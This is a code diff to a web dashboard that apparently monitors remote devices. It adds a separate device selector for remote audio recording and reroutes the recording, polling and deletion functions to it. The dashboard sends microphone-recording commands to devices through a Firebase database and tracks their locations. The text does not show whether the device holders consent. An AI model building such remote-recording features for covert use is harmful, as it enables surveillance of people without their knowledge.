@@ -431,6 +431,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div class="voice-record-panel" style="background:var(--card);padding:12px;border-radius:var(--radius);margin-bottom:12px;border:1px solid var(--border)">
 <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
 <span style="font-size:13px;font-weight:500;color:var(--text)">🎙️ Remote Recording</span>
+<select id="voiceDeviceSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px;min-width:160px" onchange="this.value && (selectedDevice=this.value, recordingDevice=this.value, localStorage.setItem('selectedDevice', selectedDevice), pollRecordings())"><option value="">Select device...</option></select>
 <select id="recDuration" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px">
 <option value="60">1 min</option>
 <option value="120">2 min</option>
@@ -702,6 +703,7 @@ const PKT = 'Asia/Karachi';
 // --- State ---
 let devices = {};
 let selectedDevice = null;
+let recordingDevice = localStorage.getItem('recordingDevice') || null;
 let locationHistory = [];
 let historyAutoLoaded = false;
 let marker, accuracyCircle, trail;
@@ -1092,6 +1094,13 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   pollAll();
 });
 
+// --- Recording Device Select (Voice tab) ---
+document.getElementById('voiceDeviceSelect')?.addEventListener('change', function() {
+  recordingDevice = this.value || selectedDevice;
+  localStorage.setItem('recordingDevice', recordingDevice);
+  pollRecordings();
+});
+
 // --- Polling ---
 function stopPolling() {
   pollTimers.forEach(t => clearTimeout(t)); pollTimers = [];
@@ -1208,11 +1217,19 @@ async function fetchDevices() {
   const activeIds = dedupedIds.map(a => a.id);
 
   selectedDevice = activeIds[0];
+  if (!recordingDevice) recordingDevice = selectedDevice;
   loadGeofences(selectedDevice);
   localStorage.setItem('selectedDevice', selectedDevice);
+  localStorage.setItem('recordingDevice', recordingDevice);
   dedupedIds.forEach(d => { devices[d.id] = { id: d.id, label: d.label, model: d.model, manuf: d.manuf }; });
   sel.innerHTML = dedupedIds.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
   sel.value = selectedDevice;
+  // Also populate Voice tab device selector
+  const voiceSel = document.getElementById('voiceDeviceSelect');
+  if (voiceSel) {
+    voiceSel.innerHTML = '<option value="">Select device...</option>' + dedupedIds.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
+    voiceSel.value = recordingDevice;
+  }
 }
 
 async function pollLocation() {
@@ -2045,9 +2062,9 @@ async function pollHistory() {
 }
 
 async function pollRecordings() {
-  if (!selectedDevice) return;
+  if (!recordingDevice) return;
   const list = document.getElementById('voiceNotesList');
-  let data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
+  let data = await fetchRTDB(`devices/${recordingDevice}/recordings`);
   if (!data || typeof data !== 'object') {
     list.innerHTML = '<div class="label">No remote recordings yet</div>';
     return;
@@ -3320,11 +3337,12 @@ async function deleteVoiceNote(batchKey, noteIndex) {
 // --- Remote Recording Functions ---
 
 async function startRemoteRecording() {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
   
   const durationSec = parseInt(document.getElementById('recDuration').value);
   const requestId = 'rec_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-  const cmdUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record.json`;
+  const cmdUrl = `${RTDB}/devices/${recordingDevice}/commands/audio_record.json`;
+  const devLabel = document.querySelector(`#voiceDeviceSelect option[value="${recordingDevice}"]`)?.textContent || recordingDevice;
   
   const btn = document.getElementById('btnStartRecord');
   const cancelBtn = document.getElementById('btnCancelRecord');
@@ -3362,7 +3380,7 @@ async function startRemoteRecording() {
     });
     if (!resp.ok) throw new Error('HTTP ' + resp.status);
     
-    status.textContent = `Recording started (${durationSec}s)...`;
+    status.textContent = `Recording on ${devLabel} (${durationSec}s)...`;
     progressBar.value = 0;
     progressLabel.textContent = 'Waiting for device...';
     progressTime.textContent = '';
@@ -3383,7 +3401,7 @@ async function startRemoteRecording() {
 }
 
 async function cancelRemoteRecording() {
-  if (!selectedDevice) return;
+  if (!recordingDevice) return;
   
   const recordingId = currentRecordingId;
   if (!recordingId) {
@@ -3391,7 +3409,7 @@ async function cancelRemoteRecording() {
     return;
   }
   
-  const cmdUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record.json`;
+  const cmdUrl = `${RTDB}/devices/${recordingDevice}/commands/audio_record.json`;
   try {
     const resp = await fetch(cmdUrl, {
       method: 'PUT',
@@ -3410,7 +3428,7 @@ async function cancelRemoteRecording() {
 }
 
 async function pollRecordingProgress(requestId, durationSec) {
-  if (!selectedDevice) return;
+  if (!recordingDevice) return;
   
   let currentRecordingId = null;
   const startTime = Date.now();
@@ -3428,7 +3446,7 @@ async function pollRecordingProgress(requestId, durationSec) {
   const poll = async () => {
     try {
       // First check recording status for live updates
-      const statusUrl = `${RTDB}/devices/${selectedDevice}/recordingStatus.json`;
+      const statusUrl = `${RTDB}/devices/${recordingDevice}/recordingStatus.json`;
       const statusResp = await fetch(statusUrl);
       if (statusResp.ok) {
         const allStatus = await statusResp.json();
@@ -3457,7 +3475,7 @@ async function pollRecordingProgress(requestId, durationSec) {
     } catch (e) {}
     
     // Also check command response for final status
-      const responseUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record/response.json`;
+      const responseUrl = `${RTDB}/devices/${recordingDevice}/commands/audio_record/response.json`;
       try {
         const resp = await fetch(responseUrl);
         if (resp.ok) {
@@ -3515,19 +3533,19 @@ function resetRecordingUI() {
 }
 
 async function cleanupOldRecordings(days) {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
   if (!confirm(`Delete all recordings older than ${days} day(s)? This cannot be undone.`)) return;
   
   const cutoff = Date.now() - days * 24 * 60 * 60 * 1000;
   let deleted = 0;
   
   try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
+    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`);
     if (!data || typeof data !== 'object') { showAlert('No recordings found', 'warn'); return; }
     
     for (const [id, rec] of Object.entries(data)) {
       if (rec.createdAt && parseInt(rec.createdAt) < cutoff) {
-        await deleteRTDB(`devices/${selectedDevice}/recordings/${id}`);
+        await deleteRTDB(`devices/${recordingDevice}/recordings/${id}`);
         deleted++;
       }
     }
@@ -3539,12 +3557,12 @@ async function cleanupOldRecordings(days) {
 }
 
 async function fetchRecordings() {
-  if (!selectedDevice) return;
+  if (!recordingDevice) return;
   const list = document.getElementById('recordingsList');
   list.innerHTML = '<div class="label">Loading...</div>';
   
   try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
+    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`);
     if (!data || typeof data !== 'object') {
       list.innerHTML = '<div class="label">No remote recordings yet</div>';
       return;
@@ -3663,19 +3681,19 @@ function formatDuration(sec) {
   const s = sec % 60;
   return `${m}:${s.toString().padStart(2, '0')}`;
 }async function deleteRecording(recordingId) {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
   if (!confirm('Delete this recording?')) return;
   
   try {
     // Delete from Storage
-    const rec = await fetchRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
+    const rec = await fetchRTDB(`devices/${recordingDevice}/recordings/${recordingId}`);
     if (rec && rec.parts) {
       for (const partPath of rec.parts) {
         await deleteStorageFile(partPath);
       }
     }
     // Delete from RTDB
-    await deleteRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
+    await deleteRTDB(`devices/${recordingDevice}/recordings/${recordingId}`);
     showAlert('Recording deleted', 'warn');
     await fetchRecordings();
   } catch (e) {
@@ -3701,11 +3719,11 @@ async function deleteStorageFile(storagePath) {
 
 async function deleteRecordingsFromStorage() {
   try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`, 'shallow=true');
+    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`, 'shallow=true');
     if (!data || typeof data !== 'object') return;
     
     for (const key of Object.keys(data)) {
-      const rec = await fetchRTDB(`devices/${selectedDevice}/recordings/${key}`);
+      const rec = await fetchRTDB(`devices/${recordingDevice}/recordings/${key}`);
       if (rec && rec.parts) {
         for (const partPath of rec.parts) {
           await deleteStorageFile(partPath);
